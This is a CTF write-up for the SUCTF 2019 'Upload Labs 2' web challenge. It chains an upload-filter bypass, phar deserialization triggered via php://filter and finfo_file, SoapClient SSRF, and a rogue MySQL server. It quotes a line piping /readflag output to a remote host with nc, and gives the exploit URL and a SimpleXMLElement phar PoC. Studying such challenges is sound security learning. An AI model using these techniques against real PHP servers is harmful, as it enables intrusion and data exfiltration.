### References

- [@peri0d, SUCTF 2019 Upload labs 2 踩坑记录, 2020-03-11](https://www.cnblogs.com/peri0d/p/12465523.html)
- [@Zedd, SUCTF 2019 出题笔记 & phar 反序列化的一些拓展, 2019-08-24](https://xz.aliyun.com/t/6057#toc-2)
- [MySQL connect file read, 2016-04-20](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

**Tag: Phar Unserialize, MySQL Client Read Arbitrary File, SoapClient**

Source code in: [Upload Labs 2](https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202)

1.In `index.php`, here are only allowed to upload image

```php
if (isset($_POST["upload"])) {
    $allowedExts = array("gif", "jpeg", "jpg", "png");
```

Also checked the `content-type` and limit the image size to 200k:

```php
if ((($_FILES["file"]["type"] == "image/gif")
            || ($_FILES["file"]["type"] == "image/jpeg")
            || ($_FILES["file"]["type"] == "image/png"))
        && ($_FILES["file"]["size"] < 204800)   // 小于 200 kb
        && in_array($extension, $allowedExts)
    )
```

then call the following code:

```php
$c = new Check($tmp_name);
$c->check();

// class.php
function check(){
    $data = file_get_contents($this->file_name);
    if (mb_strpos($data, "<?") !== FALSE) {
        die("&lt;? in contents!");
    }
}
```

The file content cannot have `<?` which means the file we upload cannot have `<?php`, But it is also possible to use `<script language='php'>...</script>`.

> **NOTE: Script tags `<script language="php"></script>` are removed from PHP 7.**

2.After successful upload file, we can search it in the `func.php` page. The submitted `url ` parameter are sanitized:

```php
if (isset($_POST["submit"]) && isset($_POST["url"])) {
    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){
        die("Go away!");
    }
```

This is to filter phar unserialize, but the same thing can be done with the `php://`.

Then create `File` class and call the `getMIME` methods:

```php
$file_path = $_POST['url'];
$file = new File($file_path);
$file->getMIME();

// class.php
function getMIME(){
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $this->type = finfo_file($finfo, $this->file_name);
    finfo_close($finfo);
}
```

As @Zedd said, the `finfo_open` method also can trigger the phar unserialize. 

So now, we can create a phar file, disguised as a gif file and upload it. Then read it through the `php://` and trigger phar unserialize.

3.`File` class has a `__wakeup` method:

```php
function __wakeup(){
    $class = new ReflectionClass($this->func);
    $a = $class->newInstanceArgs($this->file_name);
    $a->check();
}
```

If we unserialize the `File` class, we can call the `check` method of any class here. Or we should thing about the `__call` magic function.

In `admin.php`, we can see the following code:

```php
if($_SERVER['REMOTE_ADDR'] == '127.0.0.1')
```

This made me think of the SoapClient class immediately, it's `__call` function can be used for SSRF.

4.In `admin.php`, here have some very additionally puzzling code:

```php
$admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);
$admin->check();

function check(){
    $reflect = new ReflectionClass($this->clazz);
    $this->instance = $reflect->newInstanceArgs();

    $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);
    $reflectionMethod->invoke($this->instance, $this->arg1);

    $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);
    $reflectionMethod->invoke($this->instance, $this->arg2);

    $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
    $reflectionMethod->invoke($this->instance, $this->arg3);
}
```

Mentioned in @Zedd's notes(refer[2]), if the environment `Ad` class using `__destruct`, the above code is useless.

```php
function __destruct(){
    getFlag($this->ip, $this->port);
}
```

But the real environment `Ad` class uses `__wakeup`:

```php
function __wakeup(){
    system("/readflag | nc $this->ip $this->port");
}
```

So we need to unserialize the `Ad` class to get flag.

In mysqli, `LOAD DATA LOCAL INFILE` trigger phar unseriliaze again. So the code in the check function actually corresponds to the mysql `connect` and `query`:

```php
$reflect = new ReflectionClass('Mysqli');
$sql = $reflect->newInstanceArgs();

$reflectionMethod = new ReflectionMethod('Mysqli', 'init');
$reflectionMethod->invoke($sql, $arr);

$reflectionMethod = new ReflectionMethod('Mysqli', 'real_connect');    // php bug #77496
$reflectionMethod->invoke($sql, 'ip','root','123456','testdb','3306');

$reflectionMethod = new ReflectionMethod('Mysqli', 'query');
$reflectionMethod->invoke($sql, 'select 1');
```

We only need to use Rogue Mysql Server :)

5.All we have to do is link the two unserializations. Generate gif file using `poc1.php` and `poc2.php` respectively and upload them. Get the path:

```te
1.gif: upload/46c01c941bd10a9c3038752f7354f2e8/b5e9b4f86ce43ca65bd79c894c4a924c.gif
2.gif: upload/46c01c941bd10a9c3038752f7354f2e8/274a01ad7ad7ad7d73d5f0b399ae5db2.gif
```

Meanwhile, run `rogue_mysql.py` with 2.gif filename and listen a port on vps to get the `system` function results.

Then go to the `func.php` page and submit the url with 1.gif path:

```php
php://filter/resource=phar://./upload/46c01c941bd10a9c3038752f7354f2e8/b5e9b4f86ce43ca65bd79c894c4a924c.gif
```

![](https://i.imgur.com/kLwysqs.png)

---

### PS

Here is only one line of code in the `config.php`:

```php
libxml_disable_entity_loader(true);
```

Means that external entities are disabled, but why?

In reference[2], we can find the `SimpleXMLElement` class also can trigger the phar unserialize! POC:

```php
<?php
error_reporting(0);
class A {
    public function __wakeup() {
        echo "ok!";
    }
}
$poc = new SimpleXMLElement('http://zedd.cc/test/test.xml', LIBXML_NOENT, True);
```

